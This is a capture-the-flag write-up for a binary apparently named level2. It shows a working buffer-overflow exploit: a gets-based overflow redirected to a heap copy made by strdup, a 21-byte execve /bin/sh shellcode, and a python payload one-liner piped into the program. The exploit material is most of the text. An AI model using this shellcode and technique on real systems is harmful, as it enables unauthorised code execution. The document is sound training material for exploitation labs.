Let's disassemble the main function:
Dump of assembler code for function main:
0x0804853f <+0>: push %ebp
0x08048540 <+1>: mov %esp,%ebp
0x08048542 <+3>: and $0xfffffff0,%esp
0x08048545 <+6>: call 0x80484d4 <p>
0x0804854a <+11>: leave  
 0x0804854b <+12>: ret

we got a p() function with 'gets' being used inside of it:
0x080483c0 gets@plt

but the stack is secured with those statement:
0x080484fb <+39>: and $0xb0000000,%eax
0x08048500 <+44>: cmp $0xb0000000,%eax

so let's use the heap instead:
0x08048538 <+100>: call 0x80483e0 <strdup@plt>

the function returns strdup address.

let's use this shellcode
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

run on gdb the program copy paste the shell code and get the EIP offset with 'info register eip' (https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
the offset starts at 80 bytes

now we're going to create a payload of 21 bytes for the shell code, 59 bytes of arbitrary value and finally the 4 bytes address of the f() return value

python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" \* 59 + "\x08\xa0\x04\x08"' > /tmp/exploit #remove the backslash from \*

cat /tmp/exploit - | ./level2
